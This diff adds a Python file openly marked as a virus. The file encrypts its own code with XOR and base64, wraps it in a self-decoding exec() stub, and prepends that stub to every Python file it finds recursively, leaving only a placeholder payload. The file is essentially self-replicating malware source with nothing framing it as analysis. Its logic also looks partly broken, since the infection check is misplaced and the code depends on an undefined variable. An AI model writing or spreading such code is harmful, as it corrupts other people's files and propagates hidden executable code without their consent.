@@ -1,0 +1,84 @@
+#### VIRUS BEGIN ####
+
+import sys, glob, re
+
+#### Encrypt ####
+
+import base64, string, random
+
+# Get a copy of the virus
+code = cd
+key = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(len(code)))
+
+chip = ""
+for i in range(0,len(code)):
+	chip += chr(ord(code[i]) ^ ord(key[i]))
+
+chip = chip.encode()
+chip = base64.b64encode(chip)
+key = key.encode()
+
+
+#### Dec Loop ####
+
+lineCheck = "#### Infected ####\n"
+line1 = "key = " + str(key) + "\n"
+line2 = "chip = " + str(chip) + "\n"
+line3 = "import base64\n"
+line4 = "key = key.decode()\n"
+line5 = "chip = base64.b64decode(chip)\n"
+line6 = "chip = chip.decode()\n\n"
+line7 = 'cd=""\n'
+line8 = "for i in range(0,len(key)):\n"
+line9 = "		cd += chr(ord(chip[i]) ^ ord(key[i]))\n\n"
+line10 = "exec(cd, {'cd':cd})"
+
+encCode = []
+encCode.append(lineCheck)
+encCode.append(line1)
+encCode.append(line2)
+encCode.append(line3)
+encCode.append(line4)
+encCode.append(line5)
+encCode.append(line6)
+encCode.append(line7)
+encCode.append(line8)
+encCode.append(line9)
+encCode.append(line10)
+
+
+# Potential Victims
+progs = progs = glob.glob("**/*.py", recursive = True)
+
+# Check and Infect
+for prog in progs:
+	with open(prog, "r") as f:
+		file_code = f.readlines()
+
+		infected = False
+
+		for line in file_code:
+			if "#### Infected ####" in line or "#### Decode Begin ####" in line or "#### VIRUS BEGIN ####" in line:
+				infected = True
+				break
+
+			if not infected:
+				final_code = []
+				final_code.extend(encCode)
+				final_code.extend("\n")
+				final_code.extend(file_code)
+
+				with open(prog, "w") as f:
+					f.writelines(final_code)	
+
+
+
+# Payload
+print("Malicious Activity")
+
+
+
+#### VIRUS END ####
+
+
+
